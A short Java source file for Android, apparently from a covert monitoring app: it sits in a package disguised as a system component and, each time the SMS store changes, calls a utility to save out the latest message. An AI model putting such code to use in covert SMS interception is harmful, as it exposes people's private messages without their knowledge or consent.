package com.android.system.controled.receiver;

import android.database.ContentObserver;
import android.os.Handler;

import com.android.system.controled.Debug;
import com.android.system.controled.util.SmsSaveOutUtil;

public class SmsContentObserver extends ContentObserver {

	public SmsContentObserver(Handler handler) {
		super(handler);
	}

	@Override
	public void onChange(boolean selfChange) {
		super.onChange(selfChange);

		Debug.e("SmsContentObserver", "ON CHANGED !!!!!");
		SmsSaveOutUtil so = SmsSaveOutUtil.getInstence();
		so.saveLastSms();
	}

}
